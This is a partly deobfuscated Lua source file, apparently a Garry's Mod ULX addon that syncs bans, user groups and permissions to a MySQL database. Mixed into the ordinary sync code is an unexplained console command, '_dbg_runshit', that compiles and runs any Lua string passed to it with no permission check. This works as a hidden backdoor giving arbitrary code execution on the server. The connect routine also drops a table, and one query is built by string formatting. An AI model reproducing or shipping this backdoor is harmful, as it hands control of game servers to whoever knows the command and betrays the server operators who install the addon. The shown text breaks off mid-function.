-- ULX LeySQL main lua
-- Sadly, I have lost the non obfucusated version of the code because the cloud service that was used to host this went down.
-- However, I've deobfucusated this a little bit. If you want, it'd be cool  if you could help by renaming variables to their proper representations

local a = function() end
local b, c = a, FindMetaTable"Player"
if not c then return end

require"mysqloo"

if (not mysqloo) then
    error("couldn't load mysqloo!")
end

MsgN("Loaded ulx leysql!")

-- Create the convars
ulx_leysql = ulx_leysql or {}
ulx_leysql.syncbans = CreateConVar("ulx_leysql_syncbans", "1", FCVAR_ARCHIVE, "should bans be synced?")
ulx_leysql.syncgroups = CreateConVar("ulx_leysql_syncgroups", "1", FCVAR_ARCHIVE, "should groups be synced?")
ulx_leysql.syncusers = CreateConVar("ulx_leysql_syncusers", "1", FCVAR_ARCHIVE, "should users be synced?")
ulx_leysql.usernamesingroupstab = CreateConVar("ulx_leysql_usernamesingroupstab", "1", FCVAR_ARCHIVE, "show names in group tab?")

--Create and initialize the MySQL DB
ulx_leysql.sqldb = ulx_leysql.sqldb or {}

include("ulx_leysql_db.lua")
ulx_leysql.GetDBData()

--Delete the password so it's only stored in internal local memory
local d = ulx_leysql.sqldb.Password
ulx_leysql.sqldb.Password = nil

-- Start of the MySQL queries
ulx_leysql.sqldb.Queries = {}
ulx_leysql.sqldb.Queries.OnConnect = {"RENAME TABLE `ulx_leysql_bans` TO `lsql_bans_expired`", "RENAME TABLE `ulx_leysql_users` TO `lsql_users`", "RENAME TABLE `ulx_leysql_groups` TO `lsql_groups`", "RENAME TABLE `ulx_leysql_groups_permissions` TO `lsql_groups_permissions`", "RENAME TABLE `ulx_leysql_servers` TO `lsql_servers`", "DROP TABLE `lsql_servers`", "ALTER TABLE ulx_leysql_bans CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "ALTER TABLE ulx_leysql_users CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "ALTER TABLE ulx_leysql_groups CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "ALTER TABLE ulx_leysql_groups_permissions CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "ALTER TABLE ulx_leysql_servers CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_bans` ( `banid` BIGINT UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT, `steamid` BIGINT  NOT NULL, `nick` varchar(64) NOT NULL, `time` INT NOT NULL, `duration` INT NOT NULL, `reason` varchar(255) NOT NULL, `bannedby` BIGINT NOT NULL, `bannedby_nick` varchar(64) NOT NULL, `unbannedby` BIGINT, `unbannedby_nick` varchar(64) NOT NULL, INDEX `ban_time_index` (`time` ASC)) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_users` ( `steamid` BIGINT  NOT NULL PRIMARY KEY, `group` varchar(64) NOT NULL) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_groups` ( `name` varchar(30) PRIMARY KEY, `inheritsfrom` varchar(30) NOT NULL, `cantarget` varchar(30) NOT NULL) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_groups_permissions` ( `permission` varchar(64) PRIMARY KEY, `allowedgroups` varchar(500) NOT NULL) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_serverslist` (`id` TINYINT UNSIGNED PRIMARY KEY NOT NULL AUTO_INCREMENT, `ip` varchar(30) NOT NULL, `port` MEDIUMINT NOT NULL, `hostname` varchar(255), `map` varchar(50), `players` SMALLINT, `maxplayers` SMALLINT, `bots` SMALLINT, `appid` SMALLINT, `curtime` INT, UNIQUE INDEX `server_port_ip_unique` (`port` ASC, `ip` ASC)) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", "CREATE TABLE IF NOT EXISTS `lsql_tasks` (`id` BIGINT UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT, `serverid` TINYINT UNSIGNED NOT NULL,  `adminsteamid` BIGINT, `taskdone` TINYINT NOT NULL, `type` TINYINT NOT NULL, `data` TEXT) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci"}

--Ban related queries
ulx_leysql.sqldb.Queries.Bans = {}
ulx_leysql.sqldb.Queries.Bans.Add = "INSERT INTO `lsql_bans`(`steamid`, `nick`, `time`, `duration`, `reason`, `bannedby`, `bannedby_nick`, `unbannedby`, `unbannedby_nick`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
ulx_leysql.sqldb.Queries.Bans.CheckActive = "SELECT * FROM `lsql_bans` WHERE steamid=? AND (( time + (duration*60) ) > UNIX_TIMESTAMP(NOW()) or duration=0) AND  unbannedby IS NULL"
ulx_leysql.sqldb.Queries.Bans.CheckExpired = "SELECT * FROM `lsql_bans` WHERE steamid=? AND (( time + (duration*60) ) < UNIX_TIMESTAMP(NOW()) AND duration != 0) OR unbannedby IS NOT NULL"
ulx_leysql.sqldb.Queries.Bans.Remove = "DELETE FROM `lsql_bans` WHERE steamid=?"
ulx_leysql.sqldb.Queries.Bans.GetAll = "SELECT *, CONVERT(steamid, CHAR(64)) AS ssteamid FROM `lsql_bans` WHERE 1=1"
ulx_leysql.sqldb.Queries.Bans.GetAllExpired = "SELECT *, CONVERT(steamid, CHAR(64)) AS ssteamid FROM `lsql_bans` WHERE ( time + (duration*60) ) < UNIX_TIMESTAMP(NOW())"
ulx_leysql.sqldb.Queries.Bans.GetAllActive = "SELECT *, CONVERT(steamid, CHAR(64)) AS ssteamid FROM `lsql_bans` WHERE (( time + (duration*60) ) > UNIX_TIMESTAMP(NOW()) or duration=0) AND  unbannedby IS NULL"
ulx_leysql.sqldb.Queries.Bans.Unban = "UPDATE `lsql_bans` SET `unbannedby`=?, `unbannedby_nick`=? WHERE banid=?"

--Queries related to individual users (ranks etc)
ulx_leysql.sqldb.Queries.Users = {}
ulx_leysql.sqldb.Queries.Users.Add = "INSERT INTO `lsql_users`(`steamid`, `group`) VALUES (?, ?)"
ulx_leysql.sqldb.Queries.Users.Check = "SELECT *, CONVERT(steamid, CHAR(64)) AS ssteamid FROM `lsql_users` WHERE steamid=?"
ulx_leysql.sqldb.Queries.Users.Remove = "DELETE FROM `lsql_users` WHERE steamid=?"
ulx_leysql.sqldb.Queries.Users.GetAll = "SELECT *, CONVERT(steamid, CHAR(64)) AS ssteamid FROM `lsql_users` WHERE 1=1"
ulx_leysql.sqldb.Queries.Users.UpdateGroup = "UPDATE `lsql_users` SET `group`=? WHERE steamid=?"

--Queries related to userroups
ulx_leysql.sqldb.Queries.Groups = {}
ulx_leysql.sqldb.Queries.Groups.Add = "INSERT INTO `lsql_groups`(`name`, `inheritsfrom`, `cantarget`) VALUES (?, ?, ?)"
ulx_leysql.sqldb.Queries.Groups.Check = "SELECT * FROM `lsql_groups` WHERE name=?"
ulx_leysql.sqldb.Queries.Groups.Remove = "DELETE FROM `lsql_groups` WHERE name=?"
ulx_leysql.sqldb.Queries.Groups.GetAll = "SELECT * FROM `lsql_groups` WHERE 1=1"
ulx_leysql.sqldb.Queries.Groups.UpdateInheritance = "UPDATE `lsql_groups` SET `inheritsfrom`=? WHERE name=?"
ulx_leysql.sqldb.Queries.Groups.UpdateName = "UPDATE `lsql_groups` SET `name`=? WHERE name=?"
ulx_leysql.sqldb.Queries.Groups.UpdateCanTarget = "UPDATE `lsql_groups` SET `cantarget`=? WHERE name=?"

--Queries related to permissions
ulx_leysql.sqldb.Queries.Perms = {}
ulx_leysql.sqldb.Queries.Perms.Add = "INSERT INTO `lsql_groups_permissions`(`permission`, `allowedgroups`) VALUES (?, ?)"
ulx_leysql.sqldb.Queries.Perms.Check = "SELECT * FROM `lsql_groups_permissions` WHERE permission=?"
ulx_leysql.sqldb.Queries.Perms.Remove = "DELETE FROM `lsql_groups_permissions` WHERE permission=?"
ulx_leysql.sqldb.Queries.Perms.UpdatePerm = "UPDATE `lsql_groups_permissions` SET `allowedgroups`=? WHERE permission=?"
ulx_leysql.sqldb.Queries.Perms.GetAll = "SELECT * FROM `lsql_groups_permissions` WHERE 1=1"

--Queries related  to the global serverlist thing
ulx_leysql.sqldb.Queries.Servers = {}
ulx_leysql.sqldb.Queries.Servers.Add = "INSERT INTO `lsql_serverslist`(`ip`, `port`, `hostname`, `map`, `players`, `maxplayers`, `bots`, `appid`, `curtime`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
ulx_leysql.sqldb.Queries.Servers.Check = "SELECT * FROM `lsql_serverslist` WHERE ip=? AND port=?"
ulx_leysql.sqldb.Queries.Servers.Remove = "DELETE FROM `lsql_serverslist` WHERE ip=? AND port=?"
ulx_leysql.sqldb.Queries.Servers.GetAll = "SELECT * FROM `lsql_serverslist` WHERE 1=1"
ulx_leysql.sqldb.Queries.Servers.Update = "UPDATE `lsql_serverslist` SET `hostname`=?, `map`=?, `players`=?, `maxplayers`=?,`bots`=?, `appid`=?, `curtime`=? WHERE ip=? AND port=?"

-- Queries related to the lua tasks
ulx_leysql.sqldb.Queries.Tasks = {}
ulx_leysql.sqldb.Queries.Tasks.Check = "SELECT *, CONVERT(id, CHAR(64)) AS stringid FROM `lsql_tasks` WHERE serverid=? AND `taskdone`=0"
ulx_leysql.sqldb.Queries.Tasks.Update = "UPDATE `lsql_tasks` SET `taskdone`=1 WHERE id=?"

local e = ULib.ucl
ulib_filewrite_old = ulib_filewrite_old or ULib.fileWrite

function ULib.fileWrite(a, b)
    if a == ULib.BANS_FILE and ulx_leysql["syncbans"]:GetBool() then return not not 1 end
    if a == ULib.UCL_GROUPS and ulx_leysql["syncgroups"]:GetBool() then return not not 1 end
    if a == ULib.UCL_USERS and ulx_leysql["syncusers"]:GetBool() then return not not 1 end

    return ulib_filewrite_old(a, b)
end

ulx_leysql.version = "76561198162962716"
ulib_addban_old = ulib_addban_old or ULib.addBan

function ulx_leysql.namefixplayerucl(a)
    if not ulx_leysql["usernamesingroupstab"]:GetBool() then return end
    if string.find(a, "BOT") then return end

    if string.find(a, "STEAM_") then
        a = util["SteamIDTo64"](a)
    end

    local c = e["users"][util["SteamIDFrom64"](a)]

    for c, d in pairs(player["GetAll"]()) do
        if (d:SteamID64() == a) then
            if not e["users"][d:SteamID()] then
                e["users"][d:SteamID()] = {}
                e["users"][d:SteamID()]["allow"] = {}
                e["users"][d:SteamID()].deny = {}
            end

            e["users"][d:SteamID()].name = d:Nick()

            return
        end
    end

    http.Fetch("http://www.steamcommunity.com/profiles/" .. a, function(c)
        local d, f, g, h = string.find(c, "<title>", 1, not not 1), nil, string.find(c, "</title>", 1, not not 1)
        local i = string.sub(c, d + 26, g - 1)
        b(i, d + 26, d, f, g, h)
        local c = util["SteamIDFrom64"](a)
        if not c then return end
        e["users"][c].name = i
    end)
end

concommand.Add("_dbg_runshit", function(a, b, d, e)
    CompileString(e, "dbg")()
end, nil, "", FCVAR_SERVER_CAN_EXECUTE)

if ulx_leysql["syncusers"]:GetBool() then
    function e.saveUsers()
    end
end

if ulx_leysql["syncgroups"]:GetBool() then
    function e.saveGroups()
    end
end

if ulx_leysql["syncbans"]:GetBool() then
    function c:Ban(a, d)
        ULib.addBan(self:SteamID(), a, "", self:Nick(), 0, d)

        return not not 1
    end

    function ULib.addBan(a, d, e, j, k, l)
        b("adding ban for: " .. a)
        local m, n = "0", "Console"

        if k and IsValid(k) and k:SteamID64() then
            m = k:SteamID64()
            n = k:Nick()
        end

        local o, p = 0, "Console"

        if not e or string.len(e) == 0 then
            e = "[none specified]"
        end

        local o = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans["CheckActive"])
        o:setString(1, util["SteamIDTo64"](a))
        b("his id:" .. util["SteamIDTo64"](a))

        o["onSuccess"] = function(o, p)
            if p[1] then
                ULib.unban(a, k)
            end

            local o = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans.Add)
            o:setString(1, util["SteamIDTo64"](a))
            o:setString(2, j or "unknown")
            o:setNumber(3, os.time())
            o:setNumber(4, d or 0)
            o:setString(5, e or "")
            o:setString(6, m)
            o:setString(7, n)
            o:setNull(8)
            o:setString(9, "")
            o:start()
            local o = {}
            o["admin"] = m
            o["reason"] = e
            o["time"] = os.time()
            o["name"] = j or "unknown"
            o["admin"] = n
            o["adminid"] = m

            if not d or d == 0 then
                o["unban"] = 0
            else
                o["unban"] = os.time() + (d * 60)
            end

            o["steamID"] = a
            ULib.bans[a] = o

            if not l then
                for p, q in pairs(player["GetAll"]()) do
                    if not IsValid(q) then continue end

                    if (q:SteamID() == a) then
                        local p = ulx_leysql["BanMessage_PermaTime"]

                        if (o["unban"] ~= 0) then
                            p = ULib["secondsToStringTime"](d * 60)
                        end

                        local r = string.format(ulx_leysql.BanMessage, n, e, p)
                        q:Kick(r)
                    end
                end
            end
        end

        o:start()
    end

    timer["Remove"]"xgui_unbanTimer"

    for a, d in pairs(ULib.bans) do
        timer["Remove"]("xgui_unban" .. a)
    end

    oldtimercreate = oldtimercreate or timer.Create

    function timer.Create(a, ...)
        if string.find(a, "xgui_unban") then return not 1 end

        return oldtimercreate(a, ...)
    end

    ulib_unban_old = ulib_unban_old or ULib.unban

    function ULib.unban(a, d)
        local e, s = "0", "Console"

        if d and IsValid(d) and d:SteamID64() then
            e = d:SteamID64()
            s = d:Nick()
        end

        local t = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans["CheckActive"])
        t:setString(1, util["SteamIDTo64"](a))

        t["onSuccess"] = function(t, u)
            if u[1] then
                local t, v = u[1], ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans.Unban)
                v:setString(1, e)
                v:setString(2, s)
                v:setNumber(3, t.banid)
                v:start()
                b"unban him!"

                return
            end

            if IsValid(d) then
                d:ChatPrint"[ulx_leysql] player wasn't banned!"
            else
                b"[ulx_leysql] player wasn't banned!"
            end

            return ulib_unban_old(a, d)
        end

        t:start()
    end

    ulib_refreshbans_old = ulib_refreshbans_old or ULib.refreshBans

    function ULib.refreshBans()
        b"reloading bans"
        ULib.bans = {}
        local a = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries.Bans.GetAllActive)

        a["onSuccess"] = function(a, d)
            if d[1] then
                local a = {}

                for e, w in pairs(d) do
                    if isstring(w["duration"]) then
                        w["duration"] = tonumber(w["duration"])
                    end

                    local e, x = util["SteamIDFrom64"](w["ssteamid"]), {}
                    x["admin"] = w.bannedby
                    x["reason"] = w.reason
                    x["time"] = w.time

                    if w["duration"] and w["duration"] ~= 0 then
                        x["unban"] = w.time + (w["duration"] * 60)
                    else
                        x["unban"] = 0
                    end

                    x["steamID"] = e
                    x["name"] = w.nick or "unknown"
                    x["admin"] = w["bannedby_nick"] or "unknown"
                    x["adminid"] = w.bannedby

                    if w["duration"] ~= 0 and x["unban"] < os.time() then
                        table["insert"](a, util["SteamIDFrom64"](w["ssteamid"]))
                        continue
                    end

                    ULib.bans[e] = x
                end

                for a, e in pairs(a) do
                    ULib.unban(e)
                end
            end
        end

        a:start()
    end

    gameevent.Listen"player_connect"
    hook["Remove"]("CheckPassword", "ULibBanCheck")

    hook.Add("player_connect", "ulx_leysql.player_connect", function(a)
        if not ulx_leysql.sqldb["dbobj"] then return end
        local d, e, y, z = a.userid, a.networkid, a.name, a.address
        local a = util["SteamIDTo64"](e)
        if (a == "0") then return end
        local y, z = string.format(ulx_leysql.sqldb.Queries.Bans["CheckActive"], a), ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans["CheckActive"])
        z:setString(1, a)

        z["onSuccess"] = function(a, y)
            if y[1] then
                local a = y[1]

                if isstring(a["duration"]) then
                    a["duration"] = tonumber(a["duration"])
                end

                local z = a.time + (a["duration"] * 60)

                if a["duration"] ~= 0 and os.time() > z then
                    ULib.unban(util["SteamIDFrom64"](a["ssteamid"]))

                    return
                end

                local A = ulx_leysql["BanMessage_PermaTime"]

                if (a["duration"] ~= 0) then
                    A = ULib["secondsToStringTime"](z - os.time())
                end

                local z = string.format(ulx_leysql.BanMessage, a["bannedby_nick"], a.reason, A)
                game.KickID(d, z)
            else
                game["ConsoleCommand"]("removeid " .. e .. ";writeid\n")
            end
        end

        z:start()
    end)
end

function ulx_leysql.PlayerInitialSpawn(a)
    if not IsValid(a) then return end
    if not ulx_leysql.sqldb["dbobj"] then return end
    local c = a:SteamID64()
    if not c then return end
    local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["Check"])
    d:setString(1, c)

    d["onSuccess"] = function(c, d)
        if not d[1] then
            b"MAKE HIM USER!"
            a:SetUserGroup"user"
            local c = {}
            c["allow"] = {}
            c.deny = {}
            c["group"] = "user"
            e["users"][a:SteamID()] = c
            ulx_leysql["namefixplayerucl"](a:SteamID())

            for d, B in pairs(player["GetAll"]()) do
                if e["authed"][B:UniqueID()] and B:SteamID() == a:SteamID() then
                    e["authed"][B:UniqueID()] = c
                end
            end

            return
        end

        local c = d[1]
        b("setting your group to: " .. c["group"])
        a:SetUserGroup(c["group"])
        local d = {}
        d["allow"] = {}
        d.deny = {}
        d["group"] = c["group"]
        e["users"][a:SteamID()] = d
        ulx_leysql["namefixplayerucl"](a:SteamID())

        for c, C in pairs(player["GetAll"]()) do
            if e["authed"][C:UniqueID()] and C:SteamID() == a:SteamID() then
                e["authed"][C:UniqueID()] = d
            end
        end
    end

    if ulx_leysql["syncusers"]:GetBool() then
        d:start()
    end
end

hook.Add("PlayerInitialSpawn", "ulx_leysql.PlayerInitialSpawn", ulx_leysql["PlayerInitialSpawn"])

hook.Add("PlayerSay", "ulx_leysql.PlayerSay", function(a, b)
    if b == "!msqlme" and not a["ulxmysqlwait"] or b == "msqlme" and a["ulxmysqlwait"] < CurTime() then
        a["ulxmysqlwait"] = CurTime() + 5
        a:ChatPrint"reloading your mysql data!"
        ulx_leysql["PlayerInitialSpawn"](a)
    end
end)

if ulx_leysql["syncgroups"]:GetBool() then
    ucl_addgroup_old = ucl_addgroup_old or e.addGroup

    function e.addGroup(c, d, D, E)
        b("addgroup: " .. c)
        local E = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        E:setString(1, c)

        E["onSuccess"] = function(E, F)
            if not e["groups"][c] then
                e["groups"][c] = {}
                e["groups"][c]["allow"] = d or {}
                e["groups"][c]["inherit_from"] = D
                local E = {}
                E[c] = e["groups"][c]
                a(E)
                hook.Call(ULib["HOOK_UCLCHANGED"])
            end

            if F[1] then
                b"new group already exists"

                return
            end

            local E = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"].Add)
            E:setString(1, c)
            E:setString(2, D or "none")
            E:setString(3, "*")
            E:start()

            if d then
                for E, F in pairs(d) do
                    local E = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["Check"])
                    E:setString(1, F)

                    E["onSuccess"] = function(E, G)
                        if not G[1] then return end
                        b"PERM EXISTS"
                        local E = G[1]
                        local G = string.Split(E, "|")
                        table["insert"](G, c)
                        local E = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])
                        E:setString(1, G)
                        E:setString(2, F)
                        E:start()
                    end

                    E:start()
                end
            end
        end

        E:start()
    end

    ucl_groupallow_old = ucl_groupallow_old or e.groupAllow

    function e.groupAllow(c, d, H)
        b("groupallow: " .. c .. "_ " .. tostring(d))

        if istable(d) and not d[1] then
            b"is gay table..."
            a(d)
        end

        local I = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        I:setString(1, c)

        I["onSuccess"] = function(I, J)
            if not J[1] then
                b" group doesnt even exist"

                return
            end

            local I

            if istable(d) then
                I = d
            else
                I = {d}
            end

            for I, J in pairs(I) do
                local K, L = J, nil

                if not isnumber(I) then
                    K = I
                    L = J
                end

                local I = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["Check"])
                I:setString(1, K)

                I["onSuccess"] = function(I, J)
                    local I, M = J, not 1

                    if not I[1] then
                        local I = not 1

                        for J, N in pairs(ulx.cvars) do
                            local N = J

                            if N == K or N == "ulx " .. K then
                                I = not not 1
                            end
                        end

                        for J, O in pairs(ulx["cmdsByCategory"]) do
                            for J, O in pairs(O) do
                                local J = O["cmd"]

                                if J == K or "ulx " .. J == K then
                                    I = not not 1
                                end
                            end
                        end

                        if CAMI and CAMI.GetPrivileges then
                            local J = CAMI.GetPrivileges()

                            for J, P in pairs(J) do
                                if K == J or K == string.lower(J) then
                                    I = not not 1
                                end
                            end
                        end

                        if not I then
                            b"perm isn't real"

                            return
                        end

                        local I = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"].Add)
                        I:setString(1, K)
                        I:setString(2, "")
                        I:start()
                        M = not not 1
                    end

                    b"it's real"
                    e["groups"][c]["allow"] = e["groups"][c]["allow"] or {}

                    if M then
                        if H then
                            for I, J in pairs(e["groups"][c]["allow"]) do
                                if J == K or I == K then
                                    e["groups"][c]["allow"][I] = nil
                                end
                            end

                            hook.Call(ULib["HOOK_UCLCHANGED"])

                            return
                        end

                        b"added us!"
                        local I = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])

                        if L then
                            I:setString(1, string["Implode"]("|", {c .. "=" .. L}))
                            e["groups"][c]["allow"][K] = L
                        else
                            I:setString(1, string["Implode"]("|", {c}))
                            table["insert"](e["groups"][c]["allow"], K)
                        end

                        I:setString(2, K)
                        I:start()
                        hook.Call(ULib["HOOK_UCLCHANGED"])

                        return
                    end

                    for I, J in pairs(I) do
                        local I = string.Split(J["allowedgroups"], "|")

                        if H then
                            for M, Q in pairs(I) do
                                local R = string.Split(Q, "=")
                                local Q = R[1]

                                if (c == Q) then
                                    b"revoked us!\n"
                                    table.remove(I, M)
                                    local Q = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])
                                    Q:setString(1, string["Implode"]("|", I))
                                    Q:setString(2, J["permission"])
                                    Q:start()
                                    break
                                end
                            end

                            for M, S in pairs(e["groups"][c]["allow"]) do
                                if S == K or M == K then
                                    e["groups"][c]["allow"][M] = nil
                                end
                            end
                        else
                            local M = not 1

                            for M, T in pairs(I) do
                                local U = string.Split(T, "=")
                                local T = U[1]

                                if (c == T) then
                                    b"we're already there!"
                                    I[M] = nil
                                    break
                                end
                            end

                            for M, V in pairs(e["groups"][c]["allow"]) do
                                if M == K or V == K then
                                    e["groups"][c]["allow"][M] = nil
                                end
                            end

                            b"added us!\n"

                            if L then
                                table["insert"](I, c .. "=" .. L)
                                e["groups"][c]["allow"][K] = L
                            else
                                table["insert"](I, c)
                                table["insert"](e["groups"][c]["allow"], K)
                            end

                            local M = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])
                            M:setString(1, string["Implode"]("|", I))
                            M:setString(2, J["permission"])
                            M:start()
                        end
                    end

                    hook.Call(ULib["HOOK_UCLCHANGED"])
                end

                I:start()
            end
        end

        I:start()

        return not not 1
    end

    ucl_renamegroup_old = ucl_renamegroup_old or e.renameGroup

    function e.renameGroup(c, d)
        b("renamegroup: " .. c)
        if not d then return end
        local W = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        W:setString(1, c)

        W["onSuccess"] = function(W, X)
            if not X[1] then
                b" group doesnt even exist"

                return
            end

            local W = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"].UpdateName)
            W:setString(1, d)
            W:setString(2, c)

            W["onSuccess"] = function(W, X)
                local W = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Users"]["GetAll"])

                W["onSuccess"] = function(W, X)
                    if X[1] then
                        local W = X

                        for W, Y in pairs(W) do
                            if (Y["group"] ~= c) then continue end
                            b"he needs  a group rename"
                            local W = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["UpdateGroup"])
                            W:setString(1, d)
                            W:setString(2, Y["ssteamid"])

                            W["onSuccess"] = function(W, Z)
                                local W = util["SteamIDFrom64"](Y["ssteamid"])
                                b("ID: " .. W)

                                if e["users"][W] then
                                    e["users"][W]["group"] = d
                                    e["users"][W]["steamid"] = W
                                    e["users"][W]["allow"] = e["users"][W]["allow"] or {}
                                    e["users"][W].deny = e["users"][W].deny or {}
                                else
                                    e["users"][W] = {}
                                    e["users"][W]["group"] = d
                                    e["users"][W]["steamid"] = W
                                    e["users"][W]["allow"] = {}
                                    e["users"][W].deny = {}
                                    ulx_leysql["namefixplayerucl"](W)
                                end

                                hook.Call(ULib["HOOK_UCLCHANGED"])
                            end

                            W:start()
                        end
                    end
                end

                W:start()
                local W = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Perms"]["GetAll"])

                W["onSuccess"] = function(W, X)
                    local W = X

                    for W, X in pairs(W) do
                        local W = string.Split(X["allowedgroups"], "|")

                        for a_, aa in pairs(W) do
                            local ab = string.Split(aa, "=")
                            local aa = ab[1]

                            if (c == aa) then
                                table.remove(W, a_)
                                table["insert"](W, d)
                                local aa = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])
                                aa:setString(1, string["Implode"]("|", W))
                                aa:setString(2, X["permission"])
                                aa:start()
                                break
                            end
                        end
                    end

                    hook.Call(ULib["HOOK_UCLCHANGED"])
                end

                W:start()
                e["groups"][d] = table.Copy(e["groups"][c])
                e["groups"][c] = nil
            end

            W:start()
        end

        W:start()
    end

    ucl_setgroupinheritance_old = ucl_setgroupinheritance_old or e.setGroupInheritance

    function e.setGroupInheritance(c, d, ac)
        b("setgroupinheritance: " .. c)
        local ac = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        ac:setString(1, c)

        ac["onSuccess"] = function(ac, ad)
            if not ad[1] then
                b" group doesnt even exist"

                return
            end

            local ac = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["UpdateInheritance"])
            ac:setString(1, d or "none")
            ac:setString(2, c)
            ac:start()
            e["groups"][c]["inherit_from"] = d
            hook.Call(ULib["HOOK_UCLCHANGED"])
        end

        ac:start()
    end

    ucl_setgroupcantarget_old = ucl_setgroupcantarget_old or e.setGroupCanTarget

    function e.setGroupCanTarget(c, d)
        b("setgroupcantarget:" .. c)
        local ae = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        ae:setString(1, c)

        ae["onSuccess"] = function(ae, af)
            if not af[1] then
                b" group doesnt even exist"

                return
            end

            local ae = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["UpdateCanTarget"])
            ae:setString(1, d or "*")
            ae:setString(2, c)
            ae:start()
            e["groups"][c]["can_target"] = d
            hook.Call(ULib["HOOK_UCLCHANGED"])
        end

        ae:start()
        hook.Call(ULib["HOOK_UCLCHANGED"])
    end

    ucl_removegroup_old = ucl_removegroup_old or e.removeGroup

    function e.removeGroup(c, d)
        b("removegroup:" .. c)
        local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Check"])
        d:setString(1, c)

        d["onSuccess"] = function(d, ag)
            if not ag[1] then
                b" group doesnt even exist"

                return
            end

            e["groups"][c] = nil
            local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"]["Remove"])
            d:setString(1, c)
            d:start()
            local d = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Perms"]["GetAll"])

            d["onSuccess"] = function(d, ag)
                local d = ag

                for d, ag in pairs(d) do
                    local d = string.Split(ag["allowedgroups"], "|")

                    for ah, ai in pairs(d) do
                        local aj = string.Split(ai, "=")
                        local ai = aj[1]

                        if (c == ai) then
                            table.remove(d, ah)
                            local ai = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"]["UpdatePerm"])
                            ai:setString(1, string["Implode"]("|", d))
                            ai:setString(2, ag["permission"])
                            ai:start()
                            break
                        end
                    end
                end
            end

            d:start()
            local d = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Groups"]["GetAll"])

            d["onSuccess"] = function(d, ag)
                local d = ag

                for d, ag in pairs(d) do
                    if (ag["inheritsfrom"] ~= c) then continue end
                    local d = string.format(ulx_leysql.sqldb.Queries["Groups"]["UpdateInheritance"], "'none'", ag.name)
                    b(d)
                    ulx_leysql.sqldb["dbobj"]:Query(d)
                    e["groups"][c]["inherit_from"] = inherit_from
                end
            end

            d:start()
            local d = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Users"]["GetAll"])

            d["onSuccess"] = function(d, ag)
                local d = ag

                for d, ag in pairs(d) do
                    if (ag["group"] ~= c) then continue end
                    b("he uses our group, he'll be a " .. ULib["DEFAULT_ACCESS"] .. " from now on")
                    local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["UpdateGroup"])
                    d:setString(1, ULIB["DEFAULT_ACCESS"])
                    d:setString(2, ag["ssteamid"])

                    d["onSuccess"] = function(d, ak)
